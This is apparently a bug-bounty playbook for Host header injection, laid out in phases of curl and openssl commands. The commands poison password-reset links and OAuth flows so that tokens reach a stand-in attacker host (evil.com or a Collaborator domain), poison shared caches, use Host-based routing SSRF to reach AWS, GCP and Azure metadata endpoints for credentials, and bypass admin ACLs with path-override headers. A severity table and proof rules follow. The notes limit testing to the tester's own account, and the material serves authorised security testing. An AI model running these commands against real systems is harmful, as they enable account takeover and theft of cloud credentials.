# Moraa — Host header injection / poisoning

> Sourced from elementalsouls/Claude-BugHunter `hunt-host-header`. Cross-ref [[web-cache]] (unkeyed-Host
> cache poisoning is the same primitive), [[ssrf]] (routing SSRF), [[auth-oauth]] (reset-poisoning, OIDC).

## Phase 1 — Password reset poisoning (the classic, still the highest-value)
```bash
curl -X POST https://$TARGET/forgot-password -H "Host: evil.com" -d "email=test@target.com"
curl -X POST https://$TARGET/forgot-password -H "X-Forwarded-Host: evil.com" -d "email=test@target.com"
# dual-Host smuggling — some parsers read the SECOND Host line
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\n...\r\n' "$TARGET" | openssl s_client -connect $TARGET:443
curl -X POST https://$TARGET/forgot-password -H "Host: $TARGET.evil.com" -d "email=test@target.com"   # suffix trick
curl -X POST https://$TARGET/forgot-password -H "Host: $TARGET:1@evil.com" -d "email=test@target.com" # userinfo confusion
```
**Proof standard:** check the ACTUAL reset email/link — it must point at your attacker domain. Use a
Collaborator subdomain as the "evil.com" so a click gives you the token OOB. **Reflected in a debug
page ≠ proof; the token must actually land on attacker infra.**

## Phase 2 — Cache poisoning via unkeyed Host (see [[web-cache]] for the general technique)
```bash
curl -s https://$TARGET/ -H "X-Forwarded-Host: canary-$RANDOM.example" | grep -i canary   # reflected?
curl -sI "https://$TARGET/?cb=$RANDOM" | grep -iE "cache-control|x-cache|age|vary"          # cached? Vary excludes the header?
# prove poisoning: poison once, fetch CLEAN (no injected header) on the same key
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null
curl -s "$URL" | grep -i evilcdn.example   # hit here (no header sent) = POISONED for real
```

## Phase 3a — Routing SSRF (Host steers which upstream you reach)
```bash
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"                       # AWS IMDS
curl -s "https://$TARGET/computeMetadata/v1/" -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"  # GCP
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" -H "Host: 169.254.169.254" -H "Metadata: true"  # Azure
curl -s "https://$TARGET/" -H "Host: localhost:6379"                                          # internal service probe
curl -s "https://$TARGET/" -H "Host: $COLLABORATOR"                                           # blind — watch for inbound
```
Path stays on the request line; the `Host` header alone steers the reverse proxy to a different
upstream. **Proof:** body contains internal data/creds, OR Collaborator logs an inbound hit from the
target's own IP (blind SSRF via routing).

## Phase 3b — Path-override ACL bypass (IIS / Spring Cloud Gateway / edge+backend split)
```bash
curl -s "https://$TARGET/" -H "X-Original-URL: /admin"     # keep real Host; this is a DIFFERENT header
curl -s "https://$TARGET/" -H "X-Rewrite-URL: /internal/metrics"
curl -s "https://$TARGET/" -H "X-Override-URL: /debug"
```
Compare against a direct `GET /admin` that the edge correctly blocks — a different response via the
override header proves the ACL was bypassed. **Don't confuse with 3a** — this one keeps the real
`Host` and uses a path-override header; 3a puts the path on the request line and lets `Host` route.

## Phase 4 — OAuth/OIDC/SAML poisoning
```bash
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
curl -s "https://$TARGET/oauth/authorize?..." -H "Host: $COLLABORATOR"   # trace with OOB host
```
**Proof:** the auth code/token actually arrives at your Collaborator host (a real HTTP hit) —
reflection in HTML alone is not ATO.

## Phase 5 — Quick header-fuzz sweep
```bash
for H in X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override Forwarded \
         X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme; do
  echo "=== $H ==="
  curl -sI "https://$TARGET/" -H "$H: canary-$RANDOM.example" | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

## Severity
| Vector | Impact | Severity |
|---|---|---|
| Reset link host = attacker | ATO of any user | **Critical** |
| Unkeyed Host → shared-cache XSS/redirect | Mass cache poisoning | High |
| Routing SSRF → metadata creds | Cloud credential compromise | **Critical** |
| Path-override reaches an internal/admin route | Internal access | High |
| OAuth issuer/redirect_uri poisoned → code lands on attacker host | ATO via auth-flow hijack | **Critical** |

## Impact gate — the poisoned host must reach attacker infra in a real delivery

- **Reset poisoning:** the falsifier is the reset email/link ARRIVING at a host you control
  (Collaborator capture of the actual link) after a request sent with your test account. A
  reflected Host header in an HTML body is not ATO — host-header reflection alone is on the
  always-rejected list.
- The other vectors each carry their own delivery proof: a poisoned cache entry SERVED to a fresh
  request you didn't send the header in; the OAuth `code`/issuer hitting your Collaborator; the
  internal route actually reached (routing SSRF grades by the [[ssrf]] impact gate). Name the
  delivery, or what you have is a header-reflection note.

## Discipline
Reflected ≠ poisoned — always prove a FRESH request (different IP/incognito, no injected header)
still returns the payload. Own test account only. Collaborator capture is the proof bar, not a
reflected string.
